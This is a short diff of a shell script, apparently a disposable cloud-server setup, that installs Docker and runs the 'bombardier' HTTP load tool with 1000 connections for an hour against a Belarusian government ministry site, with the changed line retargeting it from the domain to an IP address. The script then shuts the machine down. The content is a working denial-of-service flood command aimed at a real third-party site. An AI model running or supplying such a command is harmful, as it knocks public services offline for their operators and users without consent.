@@ -15,6 +15,6 @@ sudo apt-get update
 
 sudo apt-get install -y docker-ce docker-ce-cli containerd.io
 
-sudo docker run --rm -i alpine/bombardier -c 1000 -d 3600s -l https://mininform.gov.by
+sudo docker run --rm -i alpine/bombardier -c 1000 -d 3600s -l https://194.54.14.132
 
 sudo shutdown now
